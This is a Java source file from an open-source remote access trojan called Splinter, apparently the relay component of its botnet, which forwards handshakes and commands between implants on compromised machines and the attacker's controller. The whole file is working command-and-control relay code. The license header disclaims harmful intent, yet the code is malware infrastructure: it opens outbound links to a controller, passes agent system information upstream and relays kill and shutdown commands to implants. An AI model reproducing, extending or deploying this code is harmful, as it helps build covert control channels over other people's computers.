/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package RelayBot;

import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public class RelayBot_ForwardConnection extends Thread
  implements Runnable, ActionListener
{
  public static final String strMyClassName = "RelayBot_ForwardConnection";
  Thread_Terminal parent = null;

  String randomNumberReceived = "";
  public String myUniqueDelimiter = "";

  private BufferedReader brIn = null;
  private PrintWriter pwOut = null;

  String forwardAddress = "";
  int forwardPort = 0;

  public Socket sktConnection = null;

  boolean continueRun = true;

  public boolean connectionEstablished = false;

  String relayedSystem_HandShake = "";

  public RelayBot_ForwardConnection(Thread_Terminal par, String addr, int prt, String relayedSysInfo)
  {
    try
    {
      this.parent = par;
      this.forwardAddress = addr;
      this.forwardPort = prt;
      this.relayedSystem_HandShake = relayedSysInfo;

      start();
    }
    catch (Exception e)
    {
      Driver.eop("Constructor", "RelayBot_ForwardConnection", e, "", false);
    }
  }

  public void run()
  {
    try
    {
      boolean success = establishForwardConnection(this.forwardAddress, this.forwardPort);

      if (success)
      {
        listenToConnection();
      }

      this.connectionEstablished = false;
    }
    catch (Exception e)
    {
      Driver.eop("Run", "RelayBot_ForwardConnection", e, "", false);
    }
  }

  public boolean listenToConnection()
  {
    try
    {
      String inputLine = "";

      while ((this.continueRun) && (!this.sktConnection.isClosed()) && ((inputLine = this.brIn.readLine()) != null) && (!inputLine.equals("disconnectImplant")) && (!inputLine.equals("disconnectRelay")))
      {
        if (inputLine.equals("shutdownRelay"))
        {
          Driver.sop("\nSHUTDOWN RECEIVED. TERMINATING RELAY NOW...");
          System.exit(0);
        }

        relayMessage_BACKWARD(inputLine);
      }

      if (inputLine.equals("disconnectRelay"))
      {
        Driver.sop("Relay Disconnection notice received. Terminating forward connection to Controller now...");

        Driver.sop("Sending Kill command to backward agent now...");
        try
        {
          relayMessage_BACKWARD("disconnectImplant");
        }
        catch (Exception localException1) {
        }
        try {
          Driver.sop("Terminating own forward connection to controller now...");
          this.sktConnection.close();
        }
        catch (Exception localException2) {
        }
        try {
          RelayBot_ServerSocket.removeImplantThread(this, getId());
        }
        catch (Exception localException3)
        {
        }
      }

      if (inputLine.equals("disconnectImplant"))
      {
        Driver.sop("Implant Disconnection notice received. Terminating forward connection to Controller now...");
        try
        {
          RelayBot_ServerSocket.removeImplantThread(this, getId());
        } catch (Exception localException4) {
        }
        Driver.sop("Sending Kill command to backward agent now...");
        try
        {
          relayMessage_BACKWARD("disconnectImplant");
        } catch (Exception localException5) {
        }
      }
      return true;
    }
    catch (NullPointerException npe)
    {
      Driver.sop("\nSocket to Controller was severed from Controller side!  - Connection Terminated");
    }
    catch (SocketException se)
    {
      Driver.sop("Confirmed, Forwardlink socket has been terminated. Attempting cleanup now...");
    }
    catch (Exception e)
    {
      Driver.eop("listenToConnection", "RelayBot_ForwardConnection", e, "", false);
    }

    try
    {
      if ((this.parent.sktMyConnection != null) && (this.parent.sktMyConnection.isConnected()))
      {
        Driver.sop("Terminating backward link to agent now...");
        this.parent.sktMyConnection.close();
        Driver.sop("Backlink socket closed.");
      }
    }
    catch (Exception localException6) {
    }
    try {
      this.parent.continueRun = false;
      this.parent.killThread = true;
    }
    catch (Exception localException7) {
    }
    try {
      RelayBot_ServerSocket.removeImplantThread(this, getId());
    } catch (Exception localException8) {
    }
    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
  }

  private boolean establishForwardConnection(String address, int port)
  {
    try
    {
      Driver.sop("Forwardlink initialized. - Attempting to connect to " + address + " : " + port);

      this.sktConnection = new Socket(address, port);

      String inputLine = "";
      this.brIn = null;
      this.pwOut = null;

      if (this.sktConnection != null)
      {
        Driver.sp("Forwardlink established!  Attempting to open streams on socket...");

        this.brIn = new BufferedReader(new InputStreamReader(this.sktConnection.getInputStream()));

        this.pwOut = new PrintWriter(new BufferedOutputStream(this.sktConnection.getOutputStream()));

        Driver.sop("Streams opened");

        this.connectionEstablished = true;

        relayMessage_FORWARD("[SPLINTER_RELAY_PROXY]" + Driver.getHandshakeData("%%%%%"));

        this.randomNumberReceived = this.brIn.readLine();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.randomNumberReceived + "]");

        relayMessage_FORWARD("[SPLINTER_RELAYED_AGENT_INFO]%%%%%" + this.relayedSystem_HandShake);

        Driver.sop("HandShake complete. " + this.myUniqueDelimiter);
      }

      return true;
    }
    catch (NullPointerException npe)
    {
      Driver.sop("Streams closed!");
    }
    catch (SocketException se)
    {
      Driver.sop("Streams closed!");
    }
    catch (UnknownHostException uhe)
    {
      Driver.sop("* RELAY UNABLE TO ESTABLISH FORWARDLINK CONNECTION TO ADDRESS: " + address + " : " + port);
    }
    catch (IOException e)
    {
      Driver.sop("* * * RELAY UNABLE TO ESTABLISH FORWARDLINK CONNECTION TO ADDRESS: " + address + " : " + port);
    }
    catch (Exception e)
    {
      Driver.eop("establishForwardConnection", "RelayBot_ForwardConnection", e, "", true);
    }

    return false;
  }

  public boolean relayMessage_FORWARD(String msg)
  {
    try
    {
      if ((this.pwOut == null) || (this.sktConnection == null) || (this.sktConnection.isClosed()))
      {
        Driver.sop("* [*] Unable to relay message!  Forward Relay link is closed!!!");
        Driver.sop("msg: " + msg);

        if (this.parent.i_am_connecting_to_controller)
        {
          relayMessage_BACKWARD("RELAY_IS_DOWN");
        }

        return false;
      }

      this.pwOut.println(msg);
      this.pwOut.flush();

      return true;
    }
    catch (NullPointerException npe)
    {
      Driver.sop("* * * Unable to relay message!  Forward Relay link is closed!!!");
    }
    catch (Exception e)
    {
      Driver.eop("relayMessage_FORWARD", "RelayBot_ForwardConnection", e, "", false);
    }

    return false;
  }

  public boolean relayMessage_BACKWARD(String msg)
  {
    try
    {
      if ((this.parent == null) || (!this.parent.continueRun) || (this.parent.killThread))
      {
        Driver.sop("Relay Backward link is dead. Terminating this relay thread...");

        this.continueRun = false;
      }

      this.parent.sendCommand_RAW(msg);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("relayMessage_BACKWARD", "RelayBot_ForwardConnection", e, "", false);
    }

    return false;
  }
}